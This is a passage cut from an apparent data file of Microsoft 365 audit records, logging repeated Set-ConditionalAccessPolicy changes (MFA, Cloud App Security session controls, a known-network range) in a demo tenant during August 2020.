'{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/11/2020 5:02:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/12/2020 1:44:50 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/12/2020 1:44:50 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/12/2020 5:28:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '8/12/2020 5:28:44 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/13/2020 2:49:19 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/13/2020 2:49:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/13/2020 5:26:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/13/2020 5:26:10 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/14/2020 2:18:53 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/14/2020 2:18:54 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/14/2020 5:38:47 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/14/2020 5:38:49 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/16/2020 1:57:15 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 1:57:13 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 5:00:37 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/16/2020 5:00:38 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/17/2020 1:59:56 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/17/2020 1:59:55 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '8/17/2020 5:14:40 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '8/17/2020 5:14:39 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\b2915792-0396-4abe-94ec-e17fa17243c5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"94c63fef-13a3-47bc-8074-75af8c65887a\\\",\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"SignInRisks\\\":{\\\"Include\\\":[{\\\"SignInRisks\\\":[\\\"High\\\",\\\"Medium\\\",\\\"Low\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'GBB demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 2:24:11 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/18/2020 5:19:26 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '8/18/2020 5:19:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '8/19/2020 2:29:04 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': 